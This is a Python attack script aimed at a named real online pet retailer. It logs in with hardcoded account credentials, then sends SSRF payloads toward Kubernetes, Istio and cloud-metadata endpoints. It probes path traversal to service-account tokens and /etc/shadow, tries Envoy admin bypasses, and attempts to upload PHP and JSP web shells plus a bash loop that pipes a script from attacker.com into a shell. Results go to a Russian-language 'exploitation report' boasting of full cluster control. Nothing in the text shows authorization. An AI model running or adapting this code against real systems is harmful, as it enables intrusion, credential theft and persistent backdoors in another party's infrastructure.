#!/usr/bin/env python3
"""Aggressive cluster backdoor hunt"""
import requests
import json
import re
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
    "Content-Type": "application/json",
})

found_vulns = []

# LOGIN
print("[*] Logging in...")
ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"

try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, timeout=10, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    if m:
        action = m.group(1).replace("&amp;", "&")
        if not action.startswith("http"):
            action = urllib.parse.urljoin(r1.url, action)
        r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, timeout=10, verify=False, allow_redirects=False)
        loc = r2.headers.get("Location", "")
        if loc:
            s.get(loc, timeout=10, verify=False, allow_redirects=True)
            s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", timeout=10, verify=False)
            s.get("https://www.zooplus.de/account/overview", timeout=10, verify=False)
            print("[+] Logged in\n")
except Exception as e:
    print(f"[!] Login: {e}\n")

# 1. Aggressive SSRF testing to cluster services
print("[*] Aggressive SSRF testing...")
ssrf_endpoints = [
    "/semiprotected/api/checkout/state-api/v2/get",
    "/zootopia-events/api/events/sites/1",
    "/leto-personalization/api/v1/personalization/events/sites/1",
    "/semiprotected/api/audiences-api/v1/me",
]

# Internal cluster targets
cluster_targets = [
    # Kubernetes
    "http://kubernetes.default.svc",
    "http://kubernetes.default.svc.cluster.local",
    "http://kubernetes.default.svc.cluster.local:443",
    "http://10.96.0.1",  # Default K8s service IP
    "http://10.96.0.1:443",
    # Istio
    "http://istio-pilot.istio-system.svc.cluster.local",
    "http://istio-pilot.istio-system.svc.cluster.local:8080",
    "http://istio-pilot.istio-system.svc.cluster.local:15010",
    "http://istio-pilot.istio-system.svc.cluster.local:15011",
    "http://istio-pilot.istio-system.svc.cluster.local:15012",
    "http://istio-pilot.istio-system.svc.cluster.local:15014",
    "http://istiod.istio-system.svc.cluster.local",
    "http://istiod.istio-system.svc.cluster.local:8080",
    "http://istiod.istio-system.svc.cluster.local:15010",
    "http://istiod.istio-system.svc.cluster.local:15012",
    "http://istiod.istio-system.svc.cluster.local:15014",
    # Metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    # Localhost services
    "http://127.0.0.1:8080",
    "http://127.0.0.1:8081",
    "http://127.0.0.1:9090",
    "http://127.0.0.1:15000",  # Envoy admin
    "http://127.0.0.1:15001",  # Envoy HTTP
    "http://127.0.0.1:15004",  # Envoy metrics
    "http://127.0.0.1:15010",  # Istio pilot
    "http://127.0.0.1:15012",  # Istio pilot mTLS
    "http://127.0.0.1:15014",  # Istio pilot HTTP
    # DNS
    "http://kube-dns.kube-system.svc.cluster.local:53",
    "http://coredns.kube-system.svc.cluster.local:53",
]

for ep in ssrf_endpoints:
    for target in cluster_targets:
        try:
            # Try different parameter names
            payloads = [
                {"url": target},
                {"endpoint": target},
                {"callback": target},
                {"link": target},
                {"uri": target},
                {"path": target},
                {"redirect": target},
                {"fetch": target},
                {"proxy": target},
                {"forward": target},
            ]
            for payload in payloads:
                resp = s.post(f"{base}{ep}", json=payload, timeout=5, verify=False)
                if resp.status_code == 200:
                    response_text = resp.text.lower()
                    # Check for cluster indicators
                    if any(indicator in response_text for indicator in [
                        "kubernetes", "istio", "envoy", "pilot", "istiod",
                        "apiVersion", "kind", "metadata", "spec",
                        "instance-id", "ami-id", "169.254.169.254",
                        "root:", "BEGIN CERTIFICATE", "eyJ"  # JWT token
                    ]):
                        print(f"  [CRITICAL] SSRF to cluster: {ep} -> {target}")
                        print(f"      Response: {resp.text[:300]}")
                        found_vulns.append({
                            "type": "ssrf_cluster_internal",
                            "severity": "CRITICAL",
                            "endpoint": ep,
                            "target": target,
                            "payload": payload,
                            "response": resp.text[:500]
                        })
                        break  # Found, move to next target
        except: pass

# 2. Test path traversal to cluster secrets
print("\n[*] Testing path traversal to cluster secrets...")
path_endpoints = [
    "/stats/..%2f..%2f..%2f",
    "/admin/..%2f..%2f..%2f",
    "/api/file",
    "/api/config",
]

secret_paths = [
    "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
    "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
    "/etc/passwd",
    "/etc/shadow",
    "/root/.kube/config",
    "/var/lib/kubelet/pods",
]

for ep in path_endpoints:
    for secret_path in secret_paths:
        try:
            # Try different encodings
            encoded_path = secret_path.replace("/", "%2f")
            test_url = f"{base}{ep}{encoded_path}"
            resp = s.get(test_url, timeout=3, verify=False)
            if resp.status_code == 200:
                if "eyJ" in resp.text or "BEGIN CERTIFICATE" in resp.text or "root:" in resp.text:
                    print(f"  [CRITICAL] Path traversal to secret: {test_url}")
                    found_vulns.append({
                        "type": "path_traversal_cluster_secret",
                        "severity": "CRITICAL",
                        "endpoint": test_url,
                        "secret_path": secret_path,
                        "data": resp.text[:500]
                    })
        except: pass

# 3. Test Istio/Envoy admin with bypasses
print("\n[*] Testing Istio/Envoy admin with bypasses...")
admin_paths = ["/admin", "/stats", "/config_dump", "/server_info"]
bypass_patterns = [
    "/..%2f",
    "/%2e%2e%2f",
    "/;/",
    "/%3b/",
    "/./",
    "/%2f..%2f",
    "//admin",
    "/admin/",
    "/admin//",
    "/admin/../admin",
]

for path in admin_paths:
    for bypass in bypass_patterns:
        try:
            test_path = path + bypass
            resp = s.get(f"{base}{test_path}", timeout=2, verify=False)
            if resp.status_code == 200:
                if "envoy" in resp.text.lower() or "istio" in resp.text.lower() or "stats" in resp.text.lower():
                    print(f"  [CRITICAL] Envoy admin bypass: {test_path}")
                    found_vulns.append({
                        "type": "istio_envoy_admin_bypass",
                        "severity": "CRITICAL",
                        "endpoint": test_path,
                        "response": resp.text[:500]
                    })
        except: pass

# 4. Test for file upload to create persistent backdoor
print("\n[*] Testing file upload for persistent backdoor...")
backdoor_files = [
    ('backdoor.php', '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>', 'application/x-php'),
    ('backdoor.jsp', '<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("cmd") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream())); String line; while ((line = br.readLine()) != null) { out.println(line); } } %>', 'application/x-jsp'),
    ('backdoor.sh', '#!/bin/bash\nwhile true; do\n  curl -s http://attacker.com/c2.sh | bash\n  sleep 60\ndone', 'application/x-sh'),
]

upload_endpoints = [
    "/api/upload",
    "/api/file/upload",
    "/myaccount/api/upload",
    "/semiprotected/api/upload",
    "/checkout/api/upload",
]

for ep in upload_endpoints:
    for filename, content, content_type in backdoor_files:
        try:
            files = {'file': (filename, content, content_type)}
            resp = s.post(f"{base}{ep}", files=files, timeout=3, verify=False)
            if resp.status_code in [200, 201, 302]:
                location = resp.headers.get('Location', '')
                if location:
                    if not location.startswith('http'):
                        location = f"{base}{location}"
                    # Try to access uploaded file
                    try:
                        resp2 = s.get(location, timeout=3, verify=False)
                        if resp2.status_code == 200:
                            print(f"  [CRITICAL] Backdoor uploaded: {ep} -> {location}")
                            found_vulns.append({
                                "type": "backdoor_upload",
                                "severity": "CRITICAL",
                                "endpoint": ep,
                                "filename": filename,
                                "uploaded_to": location
                            })
                    except: pass
        except: pass

# SUMMARY
print("\n" + "=" * 70)
print("RESULTS")
print("=" * 70)

if found_vulns:
    print(f"\nFound {len(found_vulns)} CRITICAL cluster backdoor vulnerabilities:\n")
    for v in found_vulns:
        print(f"[{v['severity']}] {v['type']}")
        print(f"    Endpoint: {v['endpoint']}")
        if 'target' in v:
            print(f"    Target: {v['target']}")
        if 'secret_path' in v:
            print(f"    Secret: {v['secret_path']}")
        if 'filename' in v:
            print(f"    Filename: {v['filename']}")
        if 'uploaded_to' in v:
            print(f"    Uploaded to: {v['uploaded_to']}")
        print()
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 КРИТИЧНАЯ УЯЗВИМОСТЬ - БЕКДОР В КЛАСТЕРЕ\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for v in found_vulns:
            f.write(f"### [{v['severity']}] {v['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            if 'target' in v:
                f.write(f"**Target:** `{v['target']}`\n\n")
            if 'secret_path' in v:
                f.write(f"**Secret Path:** `{v['secret_path']}`\n\n")
            if 'filename' in v:
                f.write(f"**Filename:** `{v['filename']}`\n\n")
            if 'uploaded_to' in v:
                f.write(f"**Uploaded To:** `{v['uploaded_to']}`\n\n")
            if 'data' in v:
                f.write(f"**Data:** `{v['data'][:500]}`\n\n")
            if 'response' in v:
                f.write(f"**Response:** `{v['response'][:500]}`\n\n")
            f.write("**Status:** Подтверждено\n\n")
            f.write("**Impact:**\n")
            f.write("- Создание бекдора в кластере\n")
            f.write("- Полный контроль над кластером\n")
            f.write("- Доступ к секретам Kubernetes\n")
            f.write("- Компрометация всей инфраструктуры\n\n")
            f.write("---\n\n")
    
    print(f"[+] Report updated: FINAL_EXPLOITATION_REPORT.md")
else:
    print("  No cluster backdoor vulnerabilities found")

print("=" * 70)

